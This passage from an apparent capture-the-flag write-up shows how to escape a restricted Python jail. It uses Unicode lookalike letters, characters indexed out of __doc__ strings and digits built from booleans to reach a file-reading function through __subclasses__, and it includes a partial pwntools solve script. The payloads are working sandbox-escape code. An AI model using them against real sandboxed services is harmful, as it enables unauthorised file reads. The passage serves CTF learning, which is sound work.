as suitable substitutes for most of the exploit above:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-number">0</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[<span class="hljs-number">121</span>].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (4)</span><br></code></pre></td></tr></table></figure><p>Notice that we cannot use these gothic characters for the <code>flag</code> file, since <code>flag</code> is spelled with standard ASCII alphabet characters, and using <code>𝖋𝖑𝖆𝖌</code> will attempt to open a file which doesn’t exist. We need Python code which will form the string <code>flag</code> during execution without explicitly using those characters. To get around this, we can use the <code>__doc__</code> dunder attribute to obtain documentation about various objects and index that string to get the character we want. We can then concatenate the characters together to get the word <code>flag</code>! For example, to obtain the character <strong>g</strong>, we can use the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">38</span>]<br></code></pre></td></tr></table></figure><p>This will access the tuple documentation and get the 38th character (g):</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Built-<span class="hljs-keyword">in</span> immutable <span class="hljs-keyword">sequence</span>.\n\nIf no ar(g)ument <span class="hljs-keyword">is</span> given, the <span class="hljs-keyword">constructor</span> <span class="hljs-title function_">returns</span> <span class="hljs-title function_">an</span> <span class="hljs-title function_">empty</span> <span class="hljs-title function_">tuple</span>.\<span class="hljs-title function_">nIf</span> <span class="hljs-title function_">iterable</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">specified</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">tuple</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">initialized</span> <span class="hljs-title function_">from</span> <span class="hljs-title function_">iterable</span>&#x27;<span class="hljs-title function_">s</span> <span class="hljs-title function_">items</span>.\<span class="hljs-title function_">n</span>\<span class="hljs-title function_">nIf</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">argument</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">a</span> <span class="hljs-title function_">tuple</span>, <span class="hljs-title function_">the</span> <span class="hljs-title function_">return</span> <span class="hljs-title function_">value</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">same</span> <span class="hljs-title function_">object</span>.<br></code></pre></td></tr></table></figure><p>We can update (4) above using this method for all 4 characters of <code>flag</code> to get:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-number">0</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[<span class="hljs-number">121</span>].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">31</span>]+(<span class="hljs-string">&#x27;&#x27;</span>!=<span class="hljs-string">&#x27;&#x27;</span>)._＿𝖉𝖔𝖈_＿[<span class="hljs-number">3</span>]+()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">14</span>]+()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">38</span>]) <span class="hljs-comment"># (5)</span><br></code></pre></td></tr></table></figure><p>This will read the <code>flag</code> file, while bypassing all alphabet, double underscore, and builtins restrictions! Don’t believe me? Let’s do a sanity check:</p><p><img src="/../images/uoftctf24/sanity.png" alt="img1"></p><p>The last restriction we need to bypass is the one on digits <code>0123456789</code>. This is where my payload becomes monstrously long, and I apologize in advance for any mental anguish or distress I cause readers of this writeup. Turn back now if you have a serious heart condition or experience nauseua when subjected to unapologetically obnoxious one-liners of code.</p><p>The basic idea to replace digits (which two of my teammates, ahh and Matthias, helped me realize) is that in Python, <code>True</code>&#x2F;<code>False</code> are interpreted as <code>1</code>&#x2F;<code>0</code> when used in mathematical expressions. Thus, we can replace all numeric values in (5) with <code>True+True+True+...</code> for all integers &gt; 0 and <code>False</code> in the case of 0. To avoid using the strings <code>True</code> and <code>False</code> <em>directly</em>, we can substitute expressions which <em>evaluate</em> to <code>True</code>&#x2F;<code>False</code>, such as <code>(&#39;&#39;==&#39;&#39;)</code> (True) and <code>(&#39;&#39;!=&#39;&#39;)</code> (False). Thus, to form any integer, we can just add arbitrary amounts of <code>(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+...</code> together. While simple in concept, this substitution lengthens the payload <strong>considerably :)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;𝖈&#x27;</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+(<span class="hljs-string">&#x27;&#x27;</span>!=<span class="hljs-string">&#x27;&#x27;</span>)._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)])<br></code></pre></td></tr></table></figure><p>That’s it! Now with it working locally, we just need to test it on the server. Remember that the index <code>121</code> for the <code>get_data</code> function I’ve been using may be different on the remote machine, so we need to brute force it. Besides that, the payload is essentially the same. </p><p><strong>Python Solution:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># This function prints the sum of n identical expressions which evaluate to True</span><br><span class="hljs-comment"># The purpose of this is to construct any number (True + True == 2, etc.) without</span><br><span class="hljs-comment"># explicitly using alphanumeric characters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printTrue</span>(<span class="hljs-params">n</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        s += <span class="hljs-string">&quot;(&#x27;&#x27;==&#x27;&#x27;)+&quot;</span><br>    <span class="hljs-keyword">return</span> s[:-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># This spells out &#x27;flag&#x27; (according to the Dockerfile, the flag is stored in &#x27;flag&#x27;)</span><br>code2 = <span class="hljs-string">&quot;()._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+(&#x27;&#x27;!=&#x27;&#x27;)._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+()._＿𝖉𝖔𝖈_＿[(&#x2